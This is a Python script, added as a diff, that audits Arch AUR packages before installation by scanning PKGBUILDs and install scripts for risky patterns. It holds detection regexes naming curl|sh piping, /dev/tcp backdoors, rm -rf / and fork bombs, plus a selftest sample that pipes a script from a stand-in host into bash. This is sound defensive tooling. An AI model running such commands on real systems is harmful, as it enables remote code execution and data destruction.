@@ -1,0 +1,283 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+aur-audit: AUR 包自动安全审查(供 fish 里 paru 包装函数调用)
+用法: aur-audit.py <包名>...   审查一个或多个 AUR 包
+      aur-audit.py --selftest   运行内置自检
+退出码: 0 = 通过(可安全安装)   1 = 发现高风险项(应拦截)
+        2 = 获取/解析失败(网络等)   3 = 用法错误
+"""
+from __future__ import annotations
+
+import difflib
+import json
+import os
+import re
+import subprocess
+import sys
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+
+CACHE_DIR = os.path.expanduser("~/.cache/aur-audit")
+RPC_URL = "https://aur.archlinux.org/rpc/v5/info?arg[]={}"
+PLAIN_URL = "https://aur.archlinux.org/cgit/aur.git/plain/{}?h={}"
+UA = {"User-Agent": "aur-audit/1.0 (user-audit-hook)"}
+
+RED, YEL, BLU, GRN, CYN, RST = "\033[31m", "\033[33m", "\033[34m", "\033[32m", "\033[36m", "\033[0m"
+if not sys.stdout.isatty():
+    RED = YEL = BLU = GRN = CYN = RST = ""
+
+# 高风险模式:命中即拦截
+HIGH_PATTERNS = [
+    (re.compile(r"curl\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba)?sh\b"), "远程脚本直灌: curl|sh (供应链投毒经典手法)"),
+    (re.compile(r"wget\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba)?sh\b"), "远程脚本直灌: wget|sh"),
+    (re.compile(r"base64\s+(-d|--decode)"), "base64 解码(混淆载荷)"),
+    (re.compile(r"openssl\s+enc\s+-d\b"), "openssl 解密(混淆载荷)"),
+    (re.compile(r"xxd\s+-r\b"), "xxd 反序列化(混淆载荷)"),
+    (re.compile(r"/dev/(tcp|udp)/"), "网络后门 (/dev/tcp)"),
+    (re.compile(r"rm\s+-rf\s+(/\s|/\*)"), "危险删除 (rm -rf /)"),
+    (re.compile(r"chmod\s+(\+s|4[0-7]{3}\b)"), "设置 setuid"),
+    (re.compile(r"eval\s*\(\s*\"?\$?[\(\{]"), "eval 执行动态代码"),
+    (re.compile(r":\(\)\s*\{"), "fork 炸弹"),
+    (re.compile(r"\b(openssl|python3?)\b[^\n]*\b(-e|-c)\b"), "解释器 -c/-e 执行内联代码(留意混淆)"),
+]
+
+# 警告模式:展示但不拦截
+WARN_PATTERNS = [
+    (re.compile(r"\b(usermod|useradd|passwd|groupadd)\b"), "修改系统账户(服务用户?请确认)"),
+    (re.compile(r"(>|>>)\s*/etc/(?!hostname|hosts|locale|fstab|resolv|environment)"), "安装时写入 /etc 系统目录"),
+    (re.compile(r"systemctl\s+(enable|start|restart)\b"), "安装时启用/启动系统服务"),
+    (re.compile(r"\bcrontab\b"), "操作 crontab"),
+    (re.compile(r"git\s+clone\b"), "构建时动态 git clone(源码内容不可复现)"),
+]
+
+# 可信源域名(仅作提示参考)
+TRUSTED_DOMAINS = (
+    "github.com", "raw.githubusercontent.com", "gitlab.com", "bitbucket.org",
+    "codeberg.org", "archlinux.org", "sourceforge.net", "kernel.org",
+    "gnu.org", "python.org", "nodejs.org", "mozilla.org", "google.com",
+    "microsoft.com", "jetbrains.com", "code.visualstudio.com", "update.code.visualstudio.com",
+    "nvidia.com", "intel.com", "winehq.org", "qt.io", "kde.org", "gnome.org",
+)
+
+
+def fetch(url: str) -> str:
+    req = urllib.request.Request(url, headers=UA)
+    with urllib.request.urlopen(req, timeout=15) as r:
+        return r.read().decode("utf-8", "replace")
+
+
+def rpc_info(pkg: str) -> dict | None:
+    data = json.loads(fetch(RPC_URL.format(urllib.parse.quote(pkg))))
+    results = data.get("results") or []
+    return results[0] if results else None
+
+
+def scan_text(text: str, label: str, out: list) -> tuple[int, int]:
+    """扫描文本,返回 (high数, warn数),结果追加到 out"""
+    high = warn = 0
+    lines = text.splitlines()
+    for i, line in enumerate(lines, 1):
+        for pat, desc in HIGH_PATTERNS:
+            if pat.search(line):
+                high += 1
+                out.append(f"  {RED}[高危]{RST} {label}:{i}  {desc}\n        {line.strip()[:150]}")
+                break
+        for pat, desc in WARN_PATTERNS:
+            if pat.search(line):
+                warn += 1
+                out.append(f"  {YEL}[警告]{RST} {label}:{i}  {desc}\n        {line.strip()[:150]}")
+                break
+    return high, warn
+
+
+def check_urls(text: str, out: list) -> tuple[int, int]:
+    """检查 source 里的 URL:http 源 / 未知域名"""
+    high = warn = 0
+    src_block = ""
+    m = re.search(r"^\s*source\s*=\s*(\(|\"|')", text, re.M)
+    if m:
+        # 提取 source 块(简单粗暴:到下一个顶层变量或行首 var=)
+        block = text[m.start():]
+        end = re.search(r"\n\s*[a-zA-Z_][a-zA-Z0-9_]*\s*=\s*(\"|\(|\[)", block[1:])
+        src_block = block if not end else block[: end.start() + 1]
+    urls = re.findall(r"[a-z][a-z0-9+.-]*://[^\s\"')\]]+", src_block)
+    for u in urls:
+        scheme, _, rest = u.partition("://")
+        host = rest.split("/")[0]
+        if scheme in ("http", "ftp") and not u.startswith(("http://localhost", "http://127.", "http://[::1]")):
+            warn += 1
+            out.append(f"  {YEL}[警告]{RST} 源码使用非加密 {scheme}:// (可被中间人篡改): {u[:100]}")
+        elif host not in TRUSTED_DOMAINS and not host.endswith((".github.io",)):
+            out.append(f"  {BLU}[提示]{RST} 未知来源域名: {host} (确认是官方地址?)")
+    return high, warn
+
+
+def check_checksums(text: str, out: list) -> int:
+    warns = 0
+    for m in re.finditer(r"^\s*([a-z0-9]+sums)\s*=\s*\(([^)]*)\)", text, re.M | re.S):
+        algo, vals = m.group(1), m.group(2)
+        items = [v.strip().strip("\"'") for v in vals.split() if v.strip()]
+        if not items:
+            warns += 1
+            out.append(f"  {YEL}[警告]{RST} {algo} 为空(源码无完整性校验)")
+        elif all(v == "SKIP" for v in items):
+            warns += 1
+            out.append(f"  {YEL}[警告]{RST} {algo} 全部为 SKIP(无完整性校验)")
+        elif any(v == "SKIP" for v in items):
+            out.append(f"  {BLU}[提示]{RST} {algo} 部分为 SKIP")
+    return warns
+
+
+def installed_version(pkg: str) -> str:
+    try:
+        r = subprocess.run(["pacman", "-Q", pkg], capture_output=True, text=True, timeout=10)
+        return r.stdout.strip().split()[-1] if r.returncode == 0 else "(未安装)"
+    except Exception:
+        return "(未知)"
+
+
+def print_diff(old_text: str, new_text: str, out: list):
+    if old_text == new_text:
+        out.append(f"  {GRN}[提示]{RST} 与上次审查版本无变化\n")
+        return
+    diff = list(difflib.unified_diff(
+        old_text.splitlines(), new_text.splitlines(),
+        fromfile="旧(上次审查)", tofile="新(当前)", lineterm="",
+    ))
+    out.append(f"  {BLU}[提示]{RST} 与上次审查版本有差异({len([l for l in diff if l.startswith(('+','-')) and not l.startswith(('+++','---'))])} 行变更):")
+    for l in diff[2:62]:
+        color = YEL if l.startswith("+") else (RED if l.startswith("-") else "")
+        out.append(f"    {color}{l}{RST}" if color else f"    {l}")
+    if len(diff) > 62:
+        out.append(f"    ...(共 {len(diff)-2} 行,省略)")
+    out.append("")
+
+
+def audit_pkg(pkg: str) -> int:
+    out = []
+    out.append(f"{CYN}═══ aur-audit: {pkg} ═══{RST}")
+
+    # 1. 元信息(AUR RPC)
+    try:
+        info = rpc_info(pkg)
+    except Exception as e:
+        out.append(f"  {YEL}[警告]{RST} 无法获取 AUR 信息({e}),跳过该包\n")
+        print("\n".join(out))
+        return 2
+    if info is None:
+        out.append(f"  {BLU}[提示]{RST} {pkg} 不是 AUR 包(官方仓库/不存在?),无需审查\n")
+        print("\n".join(out))
+        return 0
+    if not info.get("Name"):
+        out.append(f"  {BLU}[提示]{RST} {pkg} 不是 AUR 包(官方仓库?),无需审查\n")
+        print("\n".join(out))
+        return 0
+    maintainer = info.get("Maintainer") or "(无维护者!)"
+    out.append(f"  维护者: {maintainer} | 票数: {info.get('NumVotes')} | 热度: {info.get('Popularity')} "
+               f"| 最后更新: {time.strftime('%Y-%m-%d', time.localtime(info.get('LastModified', 0)))}"
+               + (" | " + RED + "已标记过期(Out-of-date)!" + RST if info.get("OutOfDate") else "")
+               + f" | 本机: {installed_version(pkg)}")
+    if not info.get("Maintainer"):
+        out.append(f"  {YEL}[警告]{RST} 该包无维护者(comaintainer 或孤儿包,风险更高)")
+
+    # 2. 抓取 PKGBUILD
+    try:
+        pkgbuild = fetch(PLAIN_URL.format("PKGBUILD", urllib.parse.quote(pkg)))
+    except urllib.error.HTTPError as e:
+        if e.code == 404:
+            out.append(f"  {BLU}[提示]{RST} 不是 AUR 包(官方仓库?),无需审查\n")
+            print("\n".join(out))
+            return 0
+        out.append(f"  {RED}[高危]{RST} 抓取 PKGBUILD 失败(HTTP {e.code}),放行\n")
+        print("\n".join(out))
+        return 2
+    except Exception as e:
+        out.append(f"  {RED}[高危]{RST} 抓取 PKGBUILD 失败({e}),放行\n")
+        print("\n".join(out))
+        return 2
+
+    # 3. 扫描 PKGBUILD
+    hi, wa = scan_text(pkgbuild, "PKGBUILD", out)
+    hi += check_urls(pkgbuild, out)[0]
+    wa += check_checksums(pkgbuild, out)
+
+    # 4. 扫描 .install 脚本(若有)
+    install_files = re.findall(r"install\s*=\s*\(?[^\n]*?['\"]?(\$?[A-Za-z0-9_.\-]+\.install)", pkgbuild)
+    install_files = [f.replace("$pkgname", pkg).replace("$_pkgname", pkg) for f in install_files]
+    for inst in install_files:
+        try:
+            body = fetch(PLAIN_URL.format(inst, urllib.parse.quote(pkg)))
+            h2, w2 = scan_text(body, inst, out)
+            hi += h2
+            wa += w2
+            out.append(f"  {BLU}[提示]{RST} 存在安装脚本 {inst}(安装时以 root 执行,值得一看)")
+        except Exception as e:
+            out.append(f"  {BLU}[提示]{RST} 安装脚本 {inst} 获取失败({e})")
+
+    # 5. 与缓存版本 diff
+    cache_dir = os.path.join(CACHE_DIR, pkg)
+    os.makedirs(cache_dir, exist_ok=True)
+    cache_file = os.path.join(cache_dir, "PKGBUILD")
+    old = ""
+    if os.path.exists(cache_file):
+        with open(cache_file, encoding="utf-8") as f:
+            old = f.read()
+    print_diff(old, pkgbuild, out)
+    with open(cache_file, "w", encoding="utf-8") as f:
+        f.write(pkgbuild)
+
+    # 6. 判定
+    if hi > 0:
+        out.append(f"{RED}  判定: 可疑(发现 {hi} 处高危项)— 建议拦截{RST}")
+        out.append(f"{YEL}  若确属正常安装器(curl|bash 类),可输 y 继续;不确定时建议人工审查或搜索该包近期社区讨论{RST}")
+        code = 1
+    else:
+        out.append(f"{GRN}  判定: 通过{('(含 ' + str(wa) + ' 条警告/提示)' if wa else '')}{RST}")
+        code = 0
+    print("\n".join(out))
+    return code
+
+
+def selftest() -> int:
+    cases = [
+        ("恶意样本", "source=(\"https://evil.com/x\")\nbuild() { curl https://x.sh | bash }", 1),
+        ("http源", "source=(\"http://example.com/a.tar.gz\")", 0),
+        ("正常样本", 'pkgver=1.0\nsource=("https://github.com/user/repo/archive/v$pkgver.tar.gz")\nsha256sums=("abc")', 0),
+    ]
+    fails = 0
+    for name, text, expect in cases:
+        out = []
+        hi, _ = scan_text(text, "TEST", out)
+        hi += check_urls(text, out)[0]
+        code = 1 if hi > 0 else 0
+        ok = code == expect
+        fails += 0 if ok else 1
+        print(f"[{'OK' if ok else 'FAIL'}] {name} (判定={code}, 期望={expect})")
+    if fails:
+        print("自检未通过!")
+        return 1
+    print("自检全部通过 ✓")
+    return 0
+
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(__doc__)
+        sys.exit(3)
+    if sys.argv[1] == "--selftest":
+        sys.exit(selftest())
+    code = 0
+    for p in sys.argv[1:]:
+        try:
+            c = audit_pkg(p)
+        except Exception as e:
+            print(f"{YEL}⚠ 审查 {p} 时脚本异常({e}),按放行处理{RST}")
+            c = 2
+        if c == 1:
+            code = 1
+        elif c == 2 and code == 0:
+            code = 2
+    sys.exit(code)
